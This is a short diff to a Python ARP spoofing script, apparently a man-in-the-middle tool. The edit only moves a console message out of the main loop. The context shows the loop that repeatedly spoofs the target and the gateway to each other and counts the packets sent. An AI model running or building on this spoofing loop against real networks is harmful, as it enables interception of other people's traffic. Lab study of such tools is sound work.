@@ -39,10 +39,10 @@ def restore(destination_ip, source_ip):
 try:
     options = get_arguments()
     sent_packet_count = 0
+    print("\n[-] Exit from This proocess to Press CTRL + C")
     while True:
         spoof(options.target_ip, options.gateway_ip)
         spoof(options.gateway_ip, options.target_ip)
-        print("\n[-] Exit from This proocess to Press CTRL + C")
         sent_packet_count += 2
         print("\r[+] Packets sent: " + str(sent_packet_count)),
         sys.stdout.flush()
